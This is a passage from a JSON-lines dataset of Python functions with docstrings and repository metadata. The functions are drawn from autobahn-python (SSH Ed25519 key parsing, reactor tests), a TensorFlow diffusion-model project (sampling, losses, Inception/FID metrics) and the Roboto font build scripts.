"def _read_ssh_ed25519_privkey(keydata):\n", "code": "SSH_BEGIN = '-----BEGIN OPENSSH PRIVATE KEY-----'\nSSH_END = '-----END OPENSSH PRIVATE KEY-----'\nOPENSSH_KEY_V1 = b'openssh-key-v1\\0'\n\nif not (keydata.startswith(SSH_BEGIN) and keydata.endswith(SSH_END)):\n    raise Exception('invalid OpenSSH private key (does not start/end with OPENSSH preamble)')\n\nssh_end = keydata.find(SSH_END)\nkeydata = keydata[len(SSH_BEGIN):ssh_end]\nkeydata = ''.join(x.strip() for x in keydata.split())\nblob = binascii.a2b_base64(keydata)\n\nblob = blob[len(OPENSSH_KEY_V1):]\npacket = _SSHPacketReader(blob)\n\ncipher_name = packet.get_string()\nkdf = packet.get_string()\npacket.get_string()  # kdf_data\nnkeys = packet.get_uint32()\npacket.get_string()  # public_key\nkey_data = packet.get_string()\nmac = packet.get_remaining_payload()\n\nblock_size = 8\n\nif cipher_name != b'none':\n    raise Exception('encrypted private keys not supported (please remove the passphrase from your private key or use SSH agent)')\n\nif kdf != b'none':\n    raise Exception('passphrase encrypted private keys not supported')\n\nif nkeys != 1:\n    raise Exception('multiple private keys in a key file not supported (found {} keys)'.format(nkeys))\n\nif mac:\n    raise Exception('invalid OpenSSH private key (found remaining payload for mac)')\n\npacket = _SSHPacketReader(key_data)\n\npacket.get_uint32()  # check1\npacket.get_uint32()  # check2\n\nalg = packet.get_string()\n\nif alg != b'ssh-ed25519':\n    raise Exception('invalid key type: we only support Ed25519 (found \"{}\")'.format(alg.decode('ascii')))\n\nvk = packet.get_string()\nsk = packet.get_string()\n\nif len(vk) != bindings.crypto_sign_PUBLICKEYBYTES:\n    raise Exception('invalid public key length')\n\nif len(sk) != bindings.crypto_sign_SECRETKEYBYTES:\n    raise Exception('invalid public key length')\n\ncomment = packet.get_string()                             # comment\npad = packet.get_remaining_payload()\n\nif len(pad) and (len(pad) >= block_size or pad != _makepad(len(pad))):\n    raise Exception('invalid OpenSSH private key (padlen={}, actual_pad={}, expected_pad={})'.format(len(pad), pad, _makepad(len(pad))))\n\n# secret key (64 octets) = 32 octets seed || 32 octets secret key derived of seed\nseed = sk[:bindings.crypto_sign_SEEDBYTES]\n\ncomment = comment.decode('ascii')\n\nreturn seed, comment", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\n``install_optimal_reactor`` will use the default reactor if it is\nunable to detect the platform it is running on.\n\"\"\"\n", "func_signal": "def test_unknown(self):\n", "code": "reactor_mock = Mock()\nself.patch_reactor(\"selectreactor\", reactor_mock)\nself.patch(sys, \"platform\", \"unknown\")\n\n# Emulate that a reactor has not been installed\nself.patch_modules()\n\nchoosereactor.install_optimal_reactor()\nreactor_mock.install.assert_called_once_with()", "path": "autobahn-python/autobahn/twisted/test/test_tx_choosereactor.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "# transport.join() yields a joined session object when successful\n", "func_signal": "def main1(reactor, transport, details):\n", "code": "session = yield transport.join(details.config.realm)\n\n# the session is joined and can be used\nresult = yield session.call('com.example.add2', 2, 3)\nprint('result={}'.format(result))\n\nyield session.leave()", "path": "autobahn-python/examples/twisted/wamp/work/newapi/test_newapi11.py", "commit_date": "2020-03-01 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nLoad an Ed25519 key from SSH key file. The key file can be a (private) signing\nkey (from a SSH private key file) or a (public) verification key (from a SSH\npublic key file). A private key file must be passphrase-less.\n\"\"\"\n", "func_signal": "def from_ssh_data(cls, keydata):\n", "code": "SSH_BEGIN = '-----BEGIN OPENSSH PRIVATE KEY-----'\nif keydata.startswith(SSH_BEGIN):\n    # OpenSSH private key\n    keydata, comment = _read_ssh_ed25519_privkey(keydata)\n    key = signing.SigningKey(keydata, encoder=encoding.RawEncoder)\nelse:\n    # OpenSSH public key\n    keydata, comment = _read_ssh_ed25519_pubkey(keydata)\n    key = signing.VerifyKey(keydata)\n\nreturn cls(key, comment)", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nRead a Ed25519 signature file created with OpenBSD signify.\n\nhttp://man.openbsd.org/OpenBSD-current/man1/signify.1\n\"\"\"\n", "func_signal": "def _read_signify_ed25519_signature(signature_file):\n", "code": "with open(signature_file) as f:\n    # signature file format: 2nd line is base64 of 'Ed' || 8 random octets || 64 octets Ed25519 signature\n    sig = binascii.a2b_base64(f.read().splitlines()[1])[10:]\n    if len(sig) != 64:\n        raise Exception('bogus Ed25519 signature: raw signature length was {}, but expected 64'.format(len(sig)))\n    return sig", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\n``install_optimal_reactor`` will install IOCPReactor on Windows.\n\"\"\"\n", "func_signal": "def test_win(self):\n", "code": "if sys.platform != 'win32':\n    raise unittest.SkipTest('unit test requires Windows')\n\nreactor_mock = Mock()\nself.patch_reactor(\"iocpreactor\", reactor_mock)\nself.patch(sys, \"platform\", \"win32\")\n\n# Emulate that a reactor has not been installed\nself.patch_modules()\n\nchoosereactor.install_optimal_reactor()\nreactor_mock.install.assert_called_once_with()", "path": "autobahn-python/autobahn/twisted/test/test_tx_choosereactor.py", "commit_date": "2020-12-19 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nParse an OpenSSH Ed25519 public key from a string into a raw public key.\n\nExample input:\n\n    ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJukDU5fqXv/yVhSirsDWsUFyOodZyCSLxyitPPzWJW9 oberstet@office-corei7\n\n:param keydata: The OpenSSH Ed25519 public key data to parse.\n:type keydata: str\n\n:returns: pair of raw public key (32 bytes) and comment\n:rtype: tuple\n\"\"\"\n", "func_signal": "def _read_ssh_ed25519_pubkey(keydata):\n", "code": "if type(keydata) != str:\n    raise Exception(\"invalid type {} for keydata\".format(type(keydata)))\n\nparts = keydata.strip().split()\nif len(parts) != 3:\n    raise Exception('invalid SSH Ed25519 public key')\nalgo, keydata, comment = parts\n\nif algo != 'ssh-ed25519':\n    raise Exception('not a Ed25519 SSH public key (but {})'.format(algo))\n\nblob = binascii.a2b_base64(keydata)\n\ntry:\n    key = _unpack(blob)[1]\nexcept Exception as e:\n    raise Exception('could not parse key ({})'.format(e))\n\nif len(key) != 32:\n    raise Exception('invalid length {} for embedded raw key (must be 32 bytes)'.format(len(key)))\n\nreturn key, comment", "path": "autobahn-python/autobahn/wamp/cryptosign.py", "commit_date": "2020-05-13 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "# client.open() yields a connected transport when successful\n", "func_signal": "def main1(reactor, client, details):\n", "code": "transport = yield client.open()\n\n# create a session running over the transport\nsession = yield transport.join(config.realm)\nresult = yield session.call('com.example.add2', 2, 3)\nprint('result={}'.format(result))\nyield session.leave()\nyield transport.close()", "path": "autobahn-python/examples/twisted/wamp/work/newapi/test_newapi11.py", "commit_date": "2020-03-01 00:00:00", "repo_name": "crossbario/autobahn-python", "stars": 2454, "license": "mit", "language": "python", "size": 19510}
{"docstring": "\"\"\"\nGenerate samples\n\"\"\"\n", "func_signal": "def p_sample_loop(self, denoise_fn, *, shape, noise_fn=tf.random_normal):\n", "code": "i_0 = tf.constant(self.num_timesteps - 1, dtype=tf.int32)\nassert isinstance(shape, (tuple, list))\nimg_0 = noise_fn(shape=shape, dtype=tf.float32)\n_, img_final = tf.while_loop(\n  cond=lambda i_, _: tf.greater_equal(i_, 0),\n  body=lambda i_, img_: [\n    i_ - 1,\n    self.p_sample(denoise_fn=denoise_fn, x=img_, t=tf.fill([shape[0]], i_), noise_fn=noise_fn)\n  ],\n  loop_vars=[i_0, img_0],\n  shape_invariants=[i_0.shape, img_0.shape],\n  back_prop=False\n)\nassert img_final.shape == shape\nreturn img_final", "path": "diffusion/diffusion_tf/diffusion_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"\nTest against tfgan.eval.classifier_metrics\n\"\"\"\n\n", "func_signal": "def test_all():\n", "code": "import tensorflow.compat.v1 as tf\nimport tensorflow_gan as tfgan\n\nrand = np.random.RandomState(1234)\nlogits = rand.randn(64, 1008)\nasdf1, asdf2 = rand.randn(64, 2048), rand.rand(256, 2048)\nwith tf.Session() as sess:\n  assert np.allclose(\n    sess.run(tfgan.eval.classifier_score_from_logits(tf.convert_to_tensor(logits))),\n    classifier_score_from_logits(logits))\n  assert np.allclose(\n    sess.run(tfgan.eval.frechet_classifier_distance_from_activations(\n      tf.convert_to_tensor(asdf1), tf.convert_to_tensor(asdf2))),\n    frechet_classifier_distance_from_activations(asdf1, asdf2))\nprint('all ok')", "path": "diffusion/diffusion_tf/tpu_utils/classifier_metrics_numpy.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "# On the first invocation, compute Inception activations for the eval dataset\n", "func_signal": "def get(self, sess):\n", "code": "if self.cached_inception_real is None:\n  print('computing inception features on the eval set...')\n  sess.run(self.ds_iterator.initializer)  # reset the eval dataset iterator\n  inception_real_batches, tstart = [], time.time()\n  while True:\n    try:\n      inception_real_batches.append(sess.run(self.inception_real))\n    except tf.errors.OutOfRangeError:\n      break\n  self.cached_inception_real = {\n    feat_key: np.concatenate([batch[feat_key] for batch in inception_real_batches], axis=0).astype(np.float64)\n    for feat_key in ['pool_3', 'logits']\n  }\n  print('cached eval inception tensors: logits: {}, pool_3: {} (time: {})'.format(\n    self.cached_inception_real['logits'].shape, self.cached_inception_real['pool_3'].shape,\n    time.time() - tstart))\n\n  self.real_inception_score = float(\n    classifier_metrics_numpy.classifier_score_from_logits(self.cached_inception_real['logits']))\n  del self.cached_inception_real['logits']  # save memory\nprint('real inception score', self.real_inception_score)\n\nreturn self.cached_inception_real, self.real_inception_score", "path": "diffusion/diffusion_tf/tpu_utils/tpu_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"\nKL divergence between normal distributions parameterized by mean and log-variance.\n\"\"\"\n", "func_signal": "def normal_kl(mean1, logvar1, mean2, logvar2):\n", "code": "return 0.5 * (-1.0 + logvar2 - logvar1 + tf.exp(logvar1 - logvar2)\n              + tf.squared_difference(mean1, mean2) * tf.exp(-logvar2))", "path": "diffusion/diffusion_tf/diffusion_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"\nCompute the mean and variance of the diffusion posterior q(x_{t-1} | x_t, x_0)\n\"\"\"\n", "func_signal": "def q_posterior(self, x_start, x_t, t):\n", "code": "assert x_start.shape == x_t.shape\nposterior_mean = (\n    self._extract(self.posterior_mean_coef1, t, x_t.shape) * x_start +\n    self._extract(self.posterior_mean_coef2, t, x_t.shape) * x_t\n)\nposterior_variance = self._extract(self.posterior_variance, t, x_t.shape)\nposterior_log_variance_clipped = self._extract(self.posterior_log_variance_clipped, t, x_t.shape)\nassert (posterior_mean.shape[0] == posterior_variance.shape[0] == posterior_log_variance_clipped.shape[0] ==\n        x_start.shape[0])\nreturn posterior_mean, posterior_variance, posterior_log_variance_clipped", "path": "diffusion/diffusion_tf/diffusion_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"\nDiffuse the data (t == 0 means diffused for 1 step)\n\"\"\"\n", "func_signal": "def q_sample(self, x_start, t, noise=None):\n", "code": "if noise is None:\n  noise = tf.random_normal(shape=x_start.shape)\nassert noise.shape == x_start.shape\nreturn (\n    self._extract(self.sqrt_alphas_cumprod, t, x_start.shape) * x_start +\n    self._extract(self.sqrt_one_minus_alphas_cumprod, t, x_start.shape) * noise\n)", "path": "diffusion/diffusion_tf/diffusion_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"\nSharded computation followed by concat/mean for TPUStrategy.\n\"\"\"\n", "func_signal": "def distributed(fn, *, args, reduction, strategy):\n", "code": "out = strategy.experimental_run_v2(fn, args=args)\nif reduction == 'mean':\n  return tf.nest.map_structure(lambda x: tf.reduce_mean(strategy.reduce('mean', x)), out)\nelif reduction == 'concat':\n  return tf.nest.map_structure(lambda x: tf.concat(strategy.experimental_local_results(x), axis=0), out)\nelse:\n  raise NotImplementedError(reduction)", "path": "diffusion/diffusion_tf/tpu_utils/tpu_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Add a summary for a scalar tensor.\"\"\"\n", "func_signal": "def scalar(self, name, tensor, reduce_fn=tf.math.reduce_mean):\n", "code": "if not self.record:\n  return\ntensor = tf.convert_to_tensor(tensor)\nif tensor.shape.ndims == 0:\n  tensor = tf.expand_dims(tensor, 0)\nself._entries.append(\n    TpuSummaryEntry(summary.scalar, name, tensor, reduce_fn))", "path": "diffusion/diffusion_tf/tpu_utils/tpu_summaries.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Compute square root of a symmetric matrix.\n\nNote that this is different from an elementwise square root. We want to\ncompute M' where M' = sqrt(mat) such that M' * M' = mat.\n\nAlso note that this method **only** works for symmetric matrices.\n\nArgs:\n  mat: Matrix to take the square root of.\n  eps: Small epsilon such that any element less than eps will not be square\n    rooted to guard against numerical instability.\n\nReturns:\n  Matrix square root of mat.\n\"\"\"\n", "func_signal": "def _symmetric_matrix_square_root(mat, eps=1e-10):\n", "code": "u, s, vt = np.linalg.svd(mat)\n# sqrt is unstable around 0, just use 0 in such case\nsi = np.where(s < eps, s, np.sqrt(s))\nreturn u.dot(np.diag(si)).dot(vt)", "path": "diffusion/diffusion_tf/tpu_utils/classifier_metrics_numpy.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Find the trace of the positive sqrt of product of covariance matrices.\n\n'_symmetric_matrix_square_root' only works for symmetric matrices, so we\ncannot just take _symmetric_matrix_square_root(sigma * sigma_v).\n('sigma' and 'sigma_v' are symmetric, but their product is not necessarily).\n\nLet sigma = A A so A = sqrt(sigma), and sigma_v = B B.\nWe want to find trace(sqrt(sigma sigma_v)) = trace(sqrt(A A B B))\nNote the following properties:\n(i) forall M1, M2: eigenvalues(M1 M2) = eigenvalues(M2 M1)\n   => eigenvalues(A A B B) = eigenvalues (A B B A)\n(ii) if M1 = sqrt(M2), then eigenvalues(M1) = sqrt(eigenvalues(M2))\n   => eigenvalues(sqrt(sigma sigma_v)) = sqrt(eigenvalues(A B B A))\n(iii) forall M: trace(M) = sum(eigenvalues(M))\n   => trace(sqrt(sigma sigma_v)) = sum(eigenvalues(sqrt(sigma sigma_v)))\n                                 = sum(sqrt(eigenvalues(A B B A)))\n                                 = sum(eigenvalues(sqrt(A B B A)))\n                                 = trace(sqrt(A B B A))\n                                 = trace(sqrt(A sigma_v A))\nA = sqrt(sigma). Both sigma and A sigma_v A are symmetric, so we **can**\nuse the _symmetric_matrix_square_root function to find the roots of these\nmatrices.\n\nArgs:\n  sigma: a square, symmetric, real, positive semi-definite covariance matrix\n  sigma_v: same as sigma\n\nReturns:\n  The trace of the positive square root of sigma*sigma_v\n\"\"\"\n\n# Note sqrt_sigma is called \"A\" in the proof above\n", "func_signal": "def trace_sqrt_product(sigma, sigma_v):\n", "code": "sqrt_sigma = _symmetric_matrix_square_root(sigma)\n\n# This is sqrt(A sigma_v A) above\nsqrt_a_sigmav_a = sqrt_sigma.dot(sigma_v.dot(sqrt_sigma))\n\nreturn np.trace(_symmetric_matrix_square_root(sqrt_a_sigmav_a))", "path": "diffusion/diffusion_tf/tpu_utils/classifier_metrics_numpy.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Classifier score for evaluating a generative model from logits.\n\nThis method computes the classifier score for a set of logits. This can be\nused independently of the classifier_score() method, especially in the case\nof using large batches during evaluation where we would like precompute all\nof the logits before computing the classifier score.\n\nThis technique is described in detail in https://arxiv.org/abs/1606.03498. In\nsummary, this function calculates:\n\nexp( E[ KL(p(y|x) || p(y)) ] )\n\nwhich captures how different the network's classification prediction is from\nthe prior distribution over classes.\n\nArgs:\n  logits: Precomputed 2D tensor of logits that will be used to compute the\n    classifier score.\n\nReturns:\n  The classifier score. A floating-point scalar of the same type as the output\n  of `logits`.\n\"\"\"\n", "func_signal": "def classifier_score_from_logits(logits):\n", "code": "assert len(logits.shape) == 2\n\n# Use maximum precision for best results.\nlogits_dtype = logits.dtype\nif logits_dtype != np.float64:\n  logits = logits.astype(np.float64)\n\np = scipy.special.softmax(logits, axis=1)\nq = np.mean(p, axis=0)\nkl = kl_divergence(p, logits, q)\nassert len(kl.shape) == 1\nlog_score = np.mean(kl)\nfinal_score = np.exp(log_score)\n\nif logits_dtype != np.float64:\n  final_score = final_score.astype(logits_dtype)\n\nreturn final_score", "path": "diffusion/diffusion_tf/tpu_utils/classifier_metrics_numpy.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "# distributed dataset iterator\n", "func_signal": "def __init__(self, dataset, strategy, limit_dataset_size=0):\n", "code": "if limit_dataset_size > 0:\n  dataset = dataset.take(limit_dataset_size)\nself.ds_iterator = strategy.experimental_distribute_dataset(dataset).make_initializable_iterator()\n\n# inception network on the dataset\nself.inception_real = distributed(\n  lambda x_: run_inception(tfgan.eval.preprocess_image(x_['image'])),\n  args=(next(self.ds_iterator),), reduction='concat', strategy=strategy)\n\nself.cached_inception_real = None  # cached inception features\nself.real_inception_score = None  # saved inception scores for the dataset", "path": "diffusion/diffusion_tf/tpu_utils/tpu_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"\nInterpolate between images.\nt == 0 means diffuse images for 1 timestep before mixing.\n\"\"\"\n", "func_signal": "def interpolate(self, denoise_fn, *, shape, noise_fn=tf.random_normal):\n", "code": "assert isinstance(shape, (tuple, list))\n\n# Placeholders for real samples to interpolate\nx1 = tf.placeholder(tf.float32, shape)\nx2 = tf.placeholder(tf.float32, shape)\n# lam == 0.5 averages diffused images.\nlam = tf.placeholder(tf.float32, shape=())\nt = tf.placeholder(tf.int32, shape=())\n\n# Add noise via forward diffusion\n# TODO: use the same noise for both endpoints?\n# t_batched = tf.constant([t] * x1.shape[0], dtype=tf.int32)\nt_batched = tf.stack([t] * x1.shape[0])\nxt1 = self.q_sample(x1, t=t_batched)\nxt2 = self.q_sample(x2, t=t_batched)\n\n# Mix latents\n# Linear interpolation\nxt_interp = (1 - lam) * xt1 + lam * xt2\n# Constant variance interpolation\n# xt_interp = tf.sqrt(1 - lam * lam) * xt1 + lam * xt2\n\n# Reverse diffusion (similar to self.p_sample_loop)\n# t = tf.constant(t, dtype=tf.int32)\n_, x_interp = tf.while_loop(\n  cond=lambda i_, _: tf.greater_equal(i_, 0),\n  body=lambda i_, img_: [\n    i_ - 1,\n    self.p_sample(denoise_fn=denoise_fn, x=img_, t=tf.fill([shape[0]], i_), noise_fn=noise_fn)\n  ],\n  loop_vars=[t, xt_interp],\n  shape_invariants=[t.shape, xt_interp.shape],\n  back_prop=False\n)\nassert x_interp.shape == shape\n\nreturn x1, x2, lam, x_interp, t", "path": "diffusion/diffusion_tf/diffusion_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"\nTraining loss calculation\n\"\"\"\n", "func_signal": "def p_losses(self, denoise_fn, x_start, t, noise=None):\n", "code": "B, H, W, C = x_start.shape.as_list()\nassert t.shape == [B]\n\nif noise is None:\n  noise = tf.random_normal(shape=x_start.shape, dtype=x_start.dtype)\nassert noise.shape == x_start.shape and noise.dtype == x_start.dtype\nx_noisy = self.q_sample(x_start=x_start, t=t, noise=noise)\nx_recon = denoise_fn(x_noisy, t)\nassert x_noisy.shape == x_start.shape\nassert x_recon.shape[:3] == [B, H, W] and len(x_recon.shape) == 4\n\nif self.loss_type == 'noisepred':\n  # predict the noise instead of x_start. seems to be weighted naturally like SNR\n  assert x_recon.shape == x_start.shape\n  losses = nn.meanflat(tf.squared_difference(noise, x_recon))\nelse:\n  raise NotImplementedError(self.loss_type)\n\nassert losses.shape == [B]\nreturn losses", "path": "diffusion/diffusion_tf/diffusion_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Function that will run on the host machine.\"\"\"\n# Host call receives values from all tensor cores (concatenate on the\n# batch dimension). Step is the same for all cores.\n", "func_signal": "def _host_call_fn(self, step, *args):\n", "code": "step = step[0]\nlogging.info(\"host_call_fn: args=%s\", args)\nwith summary.create_file_writer(self._log_dir).as_default():\n  with summary.record_summaries_every_n_global_steps(\n      self._save_summary_steps, step):\n    for i, e in enumerate(self._entries):\n      value = e.reduce_fn(args[i])\n      e.summary_fn(e.name, value, step=step)\n    return summary.all_summary_ops()", "path": "diffusion/diffusion_tf/tpu_utils/tpu_summaries.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Returns the tuple (host_call_fn, host_call_args) for TPUEstimatorSpec.\"\"\"\n# All host_call_args must be tensors with batch dimension.\n# All tensors are streamed to the host machine (mind the band width).\n", "func_signal": "def get_host_call(self):\n", "code": "global_step = tf.train.get_or_create_global_step()\nhost_call_args = [tf.expand_dims(global_step, 0)]\nhost_call_args.extend([e.tensor for e in self._entries])\nlogging.info(\"host_call_args: %s\", host_call_args)\nreturn (self._host_call_fn, host_call_args)", "path": "diffusion/diffusion_tf/tpu_utils/tpu_summaries.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Instantiates a data set and sets the random seed.\"\"\"\n", "func_signal": "def get_dataset(name, *, tfds_data_dir=None, tfr_file=None, seed=547):\n", "code": "if name not in DATASETS:\n  raise ValueError(\"Dataset %s is not available.\" % name)\nkwargs = {}\n\nif name == 'lsun':\n  # LsunDataset takes the path to the tf record, not a directory\n  assert tfr_file is not None\n  kwargs['tfr_file'] = tfr_file\nelse:\n  kwargs['tfds_data_dir'] = tfds_data_dir\n\nif name not in ['lsun', *SimpleDataset.DATASET_NAMES]:\n  kwargs['seed'] = seed\n\nreturn DATASETS[name](**kwargs)", "path": "diffusion/diffusion_tf/tpu_utils/datasets.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "# Dummy inputs to feed to samplers\n", "func_signal": "def _make_inputs(total_bs, local_bs):\n", "code": "input_x = tf.fill([local_bs, *img_shape], value=np.nan)\ninput_y = tf.random_uniform([local_bs], 0, self.dataset.num_classes, dtype=tf.int32)\nreturn input_x, input_y", "path": "diffusion/diffusion_tf/tpu_utils/tpu_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"\nGenerate samples, returning intermediate images\nUseful for visualizing how denoised images evolve over time\nArgs:\n  repeat_noise_steps (int): Number of denoising timesteps in which the same noise\n    is used across the batch. If >= 0, the initial noise is the same for all batch elemements.\n\"\"\"\n", "func_signal": "def p_sample_loop_trajectory(self, denoise_fn, *, shape, noise_fn=tf.random_normal, repeat_noise_steps=-1):\n", "code": "i_0 = tf.constant(self.num_timesteps - 1, dtype=tf.int32)\nassert isinstance(shape, (tuple, list))\nimg_0 = noise_like(shape, noise_fn, repeat_noise_steps >= 0)\ntimes = tf.Variable([i_0])\nimgs = tf.Variable([img_0])\n# Steps with repeated noise\ntimes, imgs = tf.while_loop(\n  cond=lambda times_, _: tf.less_equal(self.num_timesteps - times_[-1], repeat_noise_steps),\n  body=lambda times_, imgs_: [\n    tf.concat([times_, [times_[-1] - 1]], 0),\n    tf.concat([imgs_, [self.p_sample(denoise_fn=denoise_fn,\n                                     x=imgs_[-1],\n                                     t=tf.fill([shape[0]], times_[-1]),\n                                     noise_fn=noise_fn,\n                                     repeat_noise=True)]], 0)\n  ],\n  loop_vars=[times, imgs],\n  shape_invariants=[tf.TensorShape([None, *i_0.shape]),\n                    tf.TensorShape([None, *img_0.shape])],\n  back_prop=False\n)\n# Steps with different noise for each batch element\ntimes, imgs = tf.while_loop(\n  cond=lambda times_, _: tf.greater_equal(times_[-1], 0),\n  body=lambda times_, imgs_: [\n    tf.concat([times_, [times_[-1] - 1]], 0),\n    tf.concat([imgs_, [self.p_sample(denoise_fn=denoise_fn,\n                                     x=imgs_[-1],\n                                     t=tf.fill([shape[0]], times_[-1]),\n                                     noise_fn=noise_fn,\n                                     repeat_noise=False)]], 0)\n  ],\n  loop_vars=[times, imgs],\n  shape_invariants=[tf.TensorShape([None, *i_0.shape]),\n                    tf.TensorShape([None, *img_0.shape])],\n  back_prop=False\n)\nassert imgs[-1].shape == shape\nreturn times, imgs", "path": "diffusion/diffusion_tf/diffusion_utils.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Add a summary for images. Tensor must be of 4-D tensor.\"\"\"\n", "func_signal": "def image(self, name, tensor, reduce_fn):\n", "code": "if not self.record:\n  return\nself._entries.append(\n    TpuSummaryEntry(summary.image, name, tensor, reduce_fn))", "path": "diffusion/diffusion_tf/tpu_utils/tpu_summaries.py", "commit_date": "2020-06-21 00:00:00", "repo_name": "hojonathanho/diffusion", "stars": 3005, "license": "None", "language": "python", "size": 105073}
{"docstring": "\"\"\"Flatten a list of references.\"\"\"\n", "func_signal": "def _flattenRefs(self, refs, flatRefs):\n", "code": "for ref in refs:\n    if type(ref) == list:\n        self._flattenRefs(ref, flatRefs)\n    elif ref != \"'\":  # ignore contextual class markings\n        flatRefs.append(ref)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Check a single positioning rule.\"\"\"\n", "func_signal": "def gposType1(self, target, value):\n", "code": "if self._checkRefs([target], self.posErr):\n    super(FilterFeatureWriter, self).gposType1(target, value)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Write the font's features to an external file.\"\"\"\n", "func_signal": "def writeFeatureFile(font, path):\n", "code": "fout = open(path, \"w\")\nfout.write(font.features.text)\nfout.close()", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Incorporate valid definitions from feature text into font.\"\"\"\n", "func_signal": "def readFeatureFile(font, text, prepend=True):\n", "code": "writer = FilterFeatureWriter(set(font.keys()))\nif prepend:\n    text += font.features.text\nelse:\n    text = font.features.text + text\nparser.parseFeatures(writer, text)\nfont.features.text = writer.write()", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
